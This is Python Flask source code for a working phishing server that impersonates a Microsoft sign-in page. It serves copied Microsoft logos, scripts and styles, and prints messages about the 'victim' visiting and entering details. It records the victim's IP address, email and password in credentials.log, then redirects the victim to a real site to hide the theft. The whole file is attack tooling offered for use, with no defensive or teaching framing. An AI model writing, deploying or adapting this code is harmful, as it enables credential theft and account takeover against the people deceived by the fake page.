from flask import Flask, request, render_template, send_file, redirect
from threading import Thread
from colorama import Fore
from sys import argv
import colorama
import logging
import smtplib
import sys
import os

#### Variables
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
display_reqs = argv[5]
ngrok_use = argv[6]


#### Config
app = Flask(__name__)
colorama.init(autoreset=True)

if display_reqs != "y" and ngrok_use != "y":
    logging.getLogger('werkzeug').disabled = True
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
elif display_reqs != "y":
    logging.getLogger('werkzeug').disabled = True
    sys.modules['flask.cli'].show_server_banner = lambda *x: None


print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to go to the link...", end="\r")
#### App.route
@app.route("/")
def email():
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim has gone to the phishing page!" + " " * 40)
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", Fore.CYAN + request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else Fore.CYAN + request.remote_addr)
    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...", end="\r")
    return render_template("email.html")


@app.route("/", methods=["POST"])
def passwd():
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered email... Waiting for password...")
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + f"{request.form.to_dict(flat=False)['loginfmt'][0]}")
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Waiting for password...")
    return render_template("password.html", email=request.form.to_dict(flat=False)["loginfmt"][0])


@app.route("/login.php", methods=["POST"])
def getcreds():
    with open("credentials.log" , "a") as file:
        print("\033[3A" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
        print("\033[1B" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{request.form.get('passwd')}" + " "*31)
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
        file.write(f"{request.form.to_dict(flat=False)['loginfmt'][0]} : {request.form.get('passwd')} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
        return redirect(redirect_url)


@app.route("/sprites/microsoft_logo.svg")
def Logo1():
    return send_file(os.path.join("templates", "sprites", "microsoft_logo.svg"))


@app.route("/sprites/icon_key.svg")
def Logo2():
    return send_file(os.path.join("templates", "sprites", "icon_key.svg"))


@app.route("/index/ConvergedLoginPaginatedStrings.EN.js")
def JS_1():
    return send_file(os.path.join("templates", "index", "ConvergedLoginPaginatedStrings.EN.js"))


@app.route("/index/login.css")
def CSS():
    return send_file(os.path.join("templates", "index", "login.css"))


@app.route("/index/ConvergedLogin_PCore.js")
def JS_2():
    return send_file(os.path.join("templates", "index", "ConvergedLogin_PCore.js"))


@app.route("/sprites/ellipsis_white.svg")
def Logo3():
    return send_file(os.path.join("templates", "sprites", "ellipsis_white.svg"))


@app.route("/sprites/ellipsis_grey.svg")
def Logo4():
    return send_file(os.path.join("templates", "sprites", "ellipsis_grey.svg"))


app.run(host=host, port=port)